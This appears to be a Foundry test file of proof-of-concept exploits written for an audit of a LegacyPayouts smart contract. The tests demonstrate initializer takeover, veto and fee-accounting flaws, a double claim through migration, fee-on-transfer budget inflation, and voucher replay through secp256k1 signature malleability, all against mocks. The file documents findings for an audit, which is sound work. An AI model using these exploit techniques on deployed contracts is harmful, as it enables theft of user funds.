// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {LegacyPayouts} from "../../src/audit/LegacyPayouts.sol";
import {USDX, FOTX} from "../../src/tokens/MockTokens.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @notice PoCs for High/Critical findings in LegacyPayouts.
contract LegacyPayoutsPoC is Test {
    LegacyPayouts internal impl;
    LegacyPayouts internal payouts;
    USDX internal usdx;

    address internal owner = makeAddr("owner");
    address internal operator = makeAddr("operator");
    address internal guardian = makeAddr("guardian");
    address internal treasury = makeAddr("treasury");
    address internal brand = makeAddr("brand");
    address internal alice = makeAddr("alice");
    address internal bob = makeAddr("bob");

    uint256 internal operatorPk = 0x0B1;
    address internal operatorSigner;

    function setUp() public {
        operatorSigner = vm.addr(operatorPk);
        operator = operatorSigner;

        impl = new LegacyPayouts();
        bytes memory init = abi.encodeCall(LegacyPayouts.initialize, (owner, operator, guardian, treasury, 1000));
        ERC1967Proxy proxy = new ERC1967Proxy(address(impl), init);
        payouts = LegacyPayouts(address(proxy));
        usdx = new USDX();
    }

    function _fund(uint256 amount) internal returns (uint256 id) {
        usdx.mint(brand, amount);
        vm.startPrank(brand);
        usdx.approve(address(payouts), amount);
        id = payouts.fund(IERC20(address(usdx)), amount, uint64(block.timestamp + 30 days));
        vm.stopPrank();
    }

    /// @notice C-01: initialize lacks initializer guard — hijack uninitialized impl or re-init proxy if exposed.
    function test_C01_uninitializedImplementation_takeover() public {
        LegacyPayouts naked = new LegacyPayouts();
        // Anyone can initialize the implementation directly and become owner, then upgrade via UUPS if used as proxy target incorrectly
        naked.initialize(address(this), address(this), address(this), address(this), 0);
        assertEq(naked.owner(), address(this));
    }

    /// @notice H-01: proposeRoot commits immediately; veto does not roll back commitment — drains budget / blocks refunds.
    function test_H01_vetoLeavesInflatedCommitment() public {
        uint256 id = _fund(1_000_000);
        vm.prank(operator);
        payouts.proposeRoot(id, keccak256("evil"), 1_000_000);

        vm.prank(guardian);
        payouts.vetoRoot(id);

        (,,,, uint256 committed,,,,) = _campaign(id);
        // Commitment stuck at 1_000_000 even though root was vetoed
        assertEq(committed, 1_000_000);

        // Brand cannot refund: amount = budget - (committed - claimed) = 0
        vm.warp(block.timestamp + 30 days + 1 hours);
        vm.prank(brand);
        vm.expectRevert("nothing to refund");
        payouts.refund(id);
    }

    /// @notice H-02: claim accounts net-after-fee into `claimed` while leaf is gross — double-claim inflation.
    function test_H02_claimFeeAccountingDoublePay() public {
        uint256 id = _fund(10_000_000);
        uint256 cum = 1_000_000;
        bytes32 leaf = keccak256(abi.encodePacked(id, alice, cum));
        vm.prank(operator);
        payouts.proposeRoot(id, leaf, cum);
        vm.warp(block.timestamp + 1 hours);
        payouts.activateRoot(id);

        bytes32[] memory proof = new bytes32[](0);
        vm.prank(alice);
        payouts.claim(id, cum, proof);

        uint256 claimedRecord = payouts.claimed(id, alice);
        // feeBps=1000 → 10%; claimed stores net (900k) not gross (1M)
        assertEq(claimedRecord, 900_000);

        // Alice can claim again for the fee gap: payout = cum - claimed = 100k
        vm.prank(alice);
        payouts.claim(id, cum, proof);
        assertGt(usdx.balanceOf(alice), 900_000);
    }

    /// @notice H-03: migrateCreator lets a user clear their claim record and re-claim.
    function test_H03_migrateCreatorDoubleClaim() public {
        uint256 id = _fund(10_000_000);
        uint256 cum = 1_000_000;
        bytes32 leaf = keccak256(abi.encodePacked(id, alice, cum));
        vm.prank(operator);
        payouts.proposeRoot(id, leaf, cum);
        vm.warp(block.timestamp + 1 hours);
        payouts.activateRoot(id);

        bytes32[] memory proof = new bytes32[](0);
        vm.prank(alice);
        payouts.claim(id, cum, proof);

        address alice2 = makeAddr("alice2");
        vm.prank(alice);
        payouts.migrateCreator(id, alice2);
        assertEq(payouts.claimed(id, alice), 0);

        // Alice claims again from zeroed record
        vm.prank(alice);
        payouts.claim(id, cum, proof);
        assertGt(usdx.balanceOf(alice), 900_000);
    }

    /// @notice H-04: topUp credits `amount` not received — FOTX drains solvency.
    function test_H04_topUpIgnoresFeeOnTransfer() public {
        FOTX fotx = new FOTX();
        fotx.mint(brand, 1_000_000);
        vm.startPrank(brand);
        fotx.approve(address(payouts), 1_000_000);
        uint256 id = payouts.fund(IERC20(address(fotx)), 1_000_000, uint64(block.timestamp + 30 days));
        // received 990_000
        fotx.mint(brand, 1_000_000);
        fotx.approve(address(payouts), 1_000_000);
        payouts.topUp(id, 1_000_000);
        vm.stopPrank();

        (,,, uint256 budget,,,,,) = _campaign(id);
        // budget inflated vs actual balance
        uint256 bal = fotx.balanceOf(address(payouts));
        assertGt(budget, bal);
    }

    /// @notice H-05: voucher keyed by signature hash — malleable secp256k1 s allows replay.
    function test_H05_voucherSignatureMalleability() public {
        uint256 id = _fund(5_000_000);
        uint256 amount = 100_000;
        uint256 nonce = 1;
        bytes32 digest = keccak256(
            abi.encodePacked(
                "\x19Ethereum Signed Message:\n32",
                keccak256(abi.encode(block.chainid, address(payouts), id, alice, amount, nonce))
            )
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(operatorPk, digest);
        bytes memory sig = abi.encodePacked(r, s, v);

        payouts.redeemVoucher(id, alice, amount, nonce, sig);

        // malleate s
        uint256 n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
        bytes32 s2 = bytes32(n - uint256(s));
        uint8 v2 = v == 27 ? 28 : 27;
        bytes memory sig2 = abi.encodePacked(r, s2, v2);

        // Second redeem with malleated sig — usedVouchers keyed by sig hash, not digest
        payouts.redeemVoucher(id, alice, amount, nonce, sig2);
        assertGe(usdx.balanceOf(alice), amount);
    }

    function _campaign(uint256 id)
        internal
        view
        returns (
            address brand_,
            IERC20 token,
            uint64 endTime,
            uint256 budget,
            uint256 committed,
            uint256 claimedTotal,
            bytes32 root,
            bytes32 pendingRoot,
            uint64 pendingAt
        )
    {
        return payouts.campaigns(id);
    }
}
